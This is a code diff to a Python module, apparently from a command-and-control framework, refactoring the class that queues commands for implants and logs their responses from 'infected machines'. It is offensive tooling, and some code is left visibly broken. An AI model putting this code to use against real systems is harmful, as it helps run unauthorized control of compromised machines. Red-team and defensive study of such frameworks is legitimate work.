@@ -3,28 +3,29 @@ import ast
 from Data.Database import Database
 from Implant.ImplantGenerator import ImplantGenerator
 from Listeners.ImplantReponseProcessor import ImplantResponseProcessor
+from Implant.ImplantFunctionality import ImplantFunctionality
+
 
 class ImplantSingleton:
     class __OnlyOne:
         IRP = ImplantResponseProcessor()
+        ImpFunc = ImplantFunctionality()
         # -- The Implant class is sole class responsible for controlling data to and from implants.
         # --    it manages  these interaction across all types of implants and communication protocols.
 
-        def AddCommand(self, User, cid, UniqueImplantKey,Command):
+        def AddCommand(self, user, cid, unique_implant_key, command):
             # AddCommand is responsible for creating new entries for implants to pickup.
             #   User validation checks must occur before a command is registered.
-            db.implant.Register_ImplantCommand(User, UniqueImplantKey, Command, cid=cid)
+            db.implant.Register_ImplantCommand(user, unique_implant_key, command, cid=cid)
 
-
-        def issue_command(self,UIK=0, c2_protocol=None):
+        def issue_command(self, UIK=0, c2_protocol=None):
             if UIK != 0:
                 # -- Issue command based on unique implant identifiers (UIK)
                 # -- UIK is embedded into the implant via Jinja on delivery.
-                # TODO
 
+                # TODO:
                 # BUG: If the X-Header is mangled this errors.
-                ImplantObj=db.implant.Get_GeneratedImplantDataFromUIK(UIK)
-                # Updates an implants last check-in time.
+                ImplantObj = db.implant.Get_GeneratedImplantDataFromUIK(UIK)
                 db.implant.Update_ImplantLastCheckIn(ImplantObj['cid'], UIK, c2_protocol)
 
                 for implant in ImplantObj:
@@ -47,13 +48,20 @@ class ImplantSingleton:
                 return None, None
 
         # -- Used by Implant - Logs command responses from infected machines.
-        def command_response(self, unique_implant_key, command_id, raw_command_result, c2_protocol=None):
+        def command_response(self, command_id, raw_command_result, c2_protocol=None):
+            # TEMP NONE WHILE changes occur
+            unique_implant_key = None
             # -- This is where the command response should be processes
             # IN DEV: Currently this returns the exact data that is submitted.
-            command_result, host_data = self.IRP.process_command_response(command_id, raw_command_result)
+            #   This entire peice of work will be replaced by the implant functionality class
+            # OLD
+            # command_result, host_data = self.IRP.process_command_response(command_id, raw_command_result)
+            # NEW
+            command_result, host_data = self.ImpFunc.process_command_response(command_id, raw_command_result)
 
             # -- End command response processing.
-            db.implant.Register_ImplantResponse(unique_implant_key, command_id, command_result, c2_protocol)
+            db.implant.Register_ImplantResponse(command_id, command_result, c2_protocol)
+
             # Once we have updates the command response we will then update the information stored within the
             # unique implant key data.
             # This data will show things like username etc.
@@ -61,7 +69,7 @@ class ImplantSingleton:
                 db.implant.update_host_data(unique_implant_key, host_data)
 
         # -- Used by webapp.
-        def Get_CommandResult(self,cid):
+        def Get_CommandResult(self, cid):
             # -- This trust any calls have already been authenticated/
             # --    May need to move authentication to this level.
             return db.implant.Get_CampaignImplantResponses(cid)
@@ -77,19 +85,20 @@ class ImplantSingleton:
             return rendered_implant
 
         # TODO:
-        # create functions for all listener/webapp/stager actions to avoid direct DB queries from ImplantManager, HttpListener/HttpsListener etc
+        # create functions for all listener/webapp/stager actions to avoid direct DB
+        # queries from ImplantManager, HttpListener/HttpsListener etc
 
         # Register implant submit stager key ( implant template returns a unique implant id aka unique implant key )
         # Implant check in: UII/UIK + protocol checkin occured over
 
-
-
     instance = None
+
     def __init__(self):
         if not ImplantSingleton.instance:
             ImplantSingleton.instance = ImplantSingleton.__OnlyOne()
         else:
             ImplantSingleton.instance.val = arg
 
+
 db = Database()
-ImplantSingleton() # Create Singleton
+ImplantSingleton()  # Create Singleton
